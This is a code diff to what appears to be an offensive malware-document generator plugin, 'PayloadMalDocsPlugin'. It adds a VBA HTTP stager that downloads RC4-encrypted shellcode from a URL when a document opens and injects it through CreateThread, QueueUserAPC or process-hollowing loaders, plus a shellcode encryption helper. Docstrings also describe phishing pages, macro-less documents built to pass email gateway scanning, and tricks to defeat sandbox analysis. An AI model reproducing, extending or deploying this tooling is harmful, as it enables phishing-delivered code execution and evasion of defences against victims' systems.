     return f"""Sub Auto_Open()
     {call_target}
 End Sub
@@ -1012,7 +1372,11 @@ def _obfuscate_vba(source: str) -> str:
                 clean.append(ch)
             out_lines.append("".join(clean).rstrip())
 
-    return "\n".join(out_lines)
+    result = "\n".join(out_lines)
+    # Strip stray bare-parens lines that can appear due to \r\n / \n mixing
+    result = re.sub(r'(?m)^\s*\(\)\s*$', '', result)
+    result = re.sub(r'\n{3,}', '\n\n', result)
+    return result
 
 
 # ---------------------------------------------------------------------------
@@ -1125,6 +1489,8 @@ class PayloadMalDocsPlugin(ErebusPlugin):
             "generate_command_execution_vba":    self.generate_command_execution_vba,
             "generate_powershell_execution_vba": self.generate_powershell_execution_vba,
             "generate_shellcode_injection_vba":  self.generate_shellcode_injection_vba,
+            "generate_http_stager_vba":          self.generate_http_stager_vba,
+            "rc4_encrypt_shellcode":             self.rc4_encrypt_shellcode,
             "generate_vba_loader_createthread":  self.generate_vba_loader_createthread,
             "generate_vba_loader_enumlocales":   self.generate_vba_loader_enumlocales,
             "generate_vba_loader_queueuserapc":  self.generate_vba_loader_queueuserapc,
@@ -1147,8 +1513,7 @@ class PayloadMalDocsPlugin(ErebusPlugin):
             # Utilities
             "export_vba_as_bas":                 self.export_vba_as_bas,
             "export_vba_as_text":                self.export_vba_as_text,
-            # Decoy / phishing
-            "create_decoy_document":             self.create_decoy_document,
+            # Phishing page (decoy doc handled by plugin_trigger_decoy_doc to avoid signature conflict)
             "create_phishing_page":              self.create_phishing_page,
         }
 
@@ -1187,6 +1552,7 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         loader_type: str = "createthread",
         target_process: str = "C:\\Windows\\System32\\notepad.exe",
     ) -> str:
+        vba_shellcode = _ensure_getbuf(vba_shellcode)
         dispatch = {
             "createthread":      self.generate_vba_loader_createthread,
             "enumlocales":       self.generate_vba_loader_enumlocales,
@@ -1196,7 +1562,46 @@ class PayloadMalDocsPlugin(ErebusPlugin):
             "hollowing":         lambda sc, tt: self.generate_vba_loader_process_hollowing(sc, tt, target_process),
         }
         fn = dispatch.get(loader_type.lower(), self.generate_vba_loader_createthread)
-        return fn(vba_shellcode, trigger_type)
+        result = fn(vba_shellcode, trigger_type)
+        result = re.sub(r'(?m)^\s*\(\)\s*$', '', result)
+        result = re.sub(r'\n{3,}', '\n\n', result)
+        return result
+
+    def rc4_encrypt_shellcode(self, shellcode: bytes, key: bytes) -> bytes:
+        """RC4-encrypt shellcode bytes for remote staging. Same key goes into VBA GetBuf."""
+        return _rc4_encrypt(shellcode, key)
+
+    def generate_http_stager_vba(
+        self,
+        url: str,
+        rc4_key: bytes,
+        trigger_type: str = "AutoOpen",
+        loader_type: str = "createthread",
+        target_process: str = "C:\\Windows\\System32\\notepad.exe",
+        is_word: bool = False,
+    ) -> str:
+        """
+        Generate a complete VBA payload that downloads RC4-encrypted shellcode
+        from *url* at runtime and injects it - no shellcode embedded in source.
+
+        *rc4_key* must match the key used to encrypt the staged blob (produced
+        by rc4_encrypt_shellcode).  The encrypted blob should be hosted at *url*
+        before the document is opened (see build artifact: shellcode.enc).
+        """
+        http_getbuf = _vba_http_getbuf(url, rc4_key)
+        dispatch = {
+            "createthread":      lambda sc, tt: _vba_createthread(sc, tt, is_word),
+            "enumlocales":       lambda sc, tt: _vba_enumlocales(sc, tt, is_word),
+            "queueuserapc":      lambda sc, tt: _vba_queueapc(sc, tt, is_word),
+            "earlybird":         lambda sc, tt: _vba_queueapc(sc, tt, is_word),
+            "hollowing":         lambda sc, tt: _vba_process_hollow(sc, tt, target_process, is_word),
+            "process_hollowing": lambda sc, tt: _vba_process_hollow(sc, tt, target_process, is_word),
+        }
+        fn = dispatch.get(loader_type.lower(), lambda sc, tt: _vba_createthread(sc, tt, is_word))
+        result = fn(http_getbuf, trigger_type)
+        result = re.sub(r'(?m)^\s*\(\)\s*$', '', result)
+        result = re.sub(r'\n{3,}', '\n\n', result)
+        return result
 
     def generate_vba_loader_createthread(
         self,
@@ -1234,6 +1639,7 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         loader_type: str = "createthread",
         target_process: str = "C:\\Windows\\System32\\notepad.exe",
     ) -> str:
+        vba_shellcode = _ensure_getbuf(vba_shellcode)
         dispatch = {
             "createthread":  lambda sc, tt: _vba_createthread(sc, tt, is_word=True),
             "enumlocales":   lambda sc, tt: _vba_enumlocales(sc, tt, is_word=True),
@@ -1243,7 +1649,10 @@ class PayloadMalDocsPlugin(ErebusPlugin):
             "process_hollowing": lambda sc, tt: _vba_process_hollow(sc, tt, target_process, is_word=True),
         }
         fn = dispatch.get(loader_type.lower(), lambda sc, tt: _vba_createthread(sc, tt, is_word=True))
-        return fn(vba_shellcode, trigger_type)
+        result = fn(vba_shellcode, trigger_type)
+        result = re.sub(r'(?m)^\s*\(\)\s*$', '', result)
+        result = re.sub(r'\n{3,}', '\n\n', result)
+        return result
 
     def obfuscate_vba(self, vba_code: str) -> str:
         return _obfuscate_vba(vba_code)
@@ -1383,7 +1792,7 @@ class PayloadMalDocsPlugin(ErebusPlugin):
     ) -> Path:
         """
         Create a clean DOCX that silently fetches a macro-enabled DOTM on open.
-        No macros in the delivered file — survives email gateway scanning.
+        No macros in the delivered file - survives email gateway scanning.
         OPSEC: use a redirector serving 404 after first retrieval to defeat sandbox re-fetch.
         """
         out = Path(output_path)
@@ -1403,9 +1812,6 @@ class PayloadMalDocsPlugin(ErebusPlugin):
     ) -> Path:
         out = Path(output_path or f"{module_name}.bas")
         out.parent.mkdir(parents=True, exist_ok=True)
-        header = f"Attribute VB_Name = \"{module_name}\"\r\n"
-        if "Attribute VB_Name" not in vba_code:
-            vba_code = header + vba_code
         out.write_text(vba_code, encoding="cp1252", errors="replace")
         return out
 
